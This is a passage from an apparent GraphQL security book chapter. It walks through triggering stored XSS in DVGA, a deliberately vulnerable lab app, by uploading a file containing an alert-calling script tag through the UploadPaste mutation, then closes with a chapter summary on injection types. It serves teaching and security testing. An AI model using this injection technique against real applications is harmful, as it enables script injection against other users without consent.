<p>Open the <b>Upload Paste</b> page in DVGA to upload the text file. This file will eventually be stored in the database. Click <b>Choose File</b> and select the file you downloaded; then click <b>Upload</b>.</p>
<p>You can use Burp Suite to intercept the request before clicking the Upload button to see what the GraphQL mutation looks like. Alternatively, use the browser’s Network tab in its developer tools. <a href="#figure8-16" id="figureanchor8-16">Figure 8-16</a> shows the mutation in Burp Suite.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08016.png"/>
<figcaption><p><a id="figure8-16">Figure 8-16</a>: The <span class="LiteralInCaption"><code>UploadPaste</code></span> mutation in Burp Suite</p></figcaption>
</figure>
<p>As you can see, we’re using <code>UploadPaste</code> to create a new paste with a local file. You can also see that we’re passing two variables, <code>content</code> and <code>filename</code>, as part of the HTTP POST JSON payload. The <code>content</code> key includes the data present in the uploaded file, and the <code>filename</code> key is the filename that the server will set on disk.</p>
<p>The payload defines an HTML heading (<code>&lt;h3&gt;</code>), a paragraph (<code>&lt;p&gt;</code>), and a JavaScript script tag (<code>&lt;script&gt;</code>) that calls the <code>alert</code> function with the string <code>Black</code> <code>Hat</code> <code>GraphQL</code>. This information will be rendered by the browser and, since <code>alert</code> is used, a pop-up window will appear, confirming our ability to run JavaScript through XSS injection.</p>
<p>After this query is sent to the server (make sure you click <b>Forward</b> in Burp Suite to do this), we can view the newly uploaded file by navigating to the <b>Private Pastes</b> page. You should be able to see a JavaScript pop-up, as shown in <a href="#figure8-17" id="figureanchor8-17">Figure 8-17</a>.</p>
<span epub:type="pagebreak" id="Page_219" title="219"/><figure>
<img alt="" class="keyline" src="image_fi/502840c08/f08017.png"/>
<figcaption><p><a id="figure8-17">Figure 8-17</a>: The paste code is executed in the browser and triggers the alert window.</p></figcaption>
</figure>
<p>We were able to trigger a Stored XSS vulnerability by using <code>UploadPaste</code> to upload a malicious text file containing JavaScript and HTML code.</p>
<h2 id="h1-502840c08-0007"><a class="XrefDestination" id="Summary"/><span class="XrefDestination" id="xref-502840c08-032"/>Summary</h2>
<p class="BodyFirst">In this chapter, we took a close look at injection vulnerabilities, ranging from those that impact databases and operating systems to those that affect client browsers, including classic and blind SQLi; reflected, stored, and DOM-based XSS; and OS command injection.</p>
<p>Many issues can arise when GraphQL APIs fail to carefully validate input. We identified the various input entry points in GraphQL—from queries, fields, and directive arguments to operation names—all of which make up the injection surface. Injection vulnerabilities can have a devastating impact on application data, and while frameworks have gotten better at protecting against them by offering reusable security methods, they are still prevalent today.</p>
</section>
</body>
</html>